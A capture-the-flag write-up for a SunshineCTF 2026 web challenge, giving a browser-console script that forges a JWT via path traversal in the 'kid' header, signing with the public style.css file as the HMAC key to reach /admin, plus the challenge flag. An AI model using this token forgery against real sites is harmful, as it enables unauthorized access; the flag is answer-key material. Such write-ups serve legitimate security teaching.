---
title: "Chrome Horizon — Manual Solve"
description: "1. Open the challenge site in Chrome. 2. Press F12 and open the Console tab. 3. Paste and run the following script:"
event: "sun"
category: "web"
categoryLabel: "Web"
tags: ["SunshineCTF 2026","web"]
date: "2026-09-28"
teammate: false
source: "sun/web/reader/MANUAL_SOLVE.md"
---

## Browser method

1. Open the challenge site in Chrome.
2. Press `F12` and open the **Console** tab.
3. Paste and run the following script:

```js
(async () => {
  const b64url = bytes =>
    btoa(String.fromCharCode(...new Uint8Array(bytes)))
      .replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");

  const json = obj => new TextEncoder().encode(JSON.stringify(obj));

  const header = {
    alg: "HS256",
    kid: "../static/style.css",
    typ: "JWT"
  };

  const payload = {
    sub: "editor",
    role: "editor"
  };

  const h = b64url(json(header));
  const p = b64url(json(payload));
  const message = `${h}.${p}`;

  const css = await fetch("/static/style.css").then(r => r.arrayBuffer());

  const key = await crypto.subtle.importKey(
    "raw", css, { name: "HMAC", hash: "SHA-256" },
    false, ["sign"]
  );

  const signature = await crypto.subtle.sign(
    "HMAC", key, new TextEncoder().encode(message)
  );

  document.cookie = `token=${message}.${b64url(signature)}; path=/`;
  location.href = "/admin";
})();
```

The script exploits the JWT `kid` path traversal vulnerability. It uses the
publicly accessible `/static/style.css` file as the HMAC signing key, forges
an editor-role token, stores it in the `token` cookie, and opens `/admin`.

## Flag

```text
sun{h0tw1r3d_4dm1n_jwt}
```
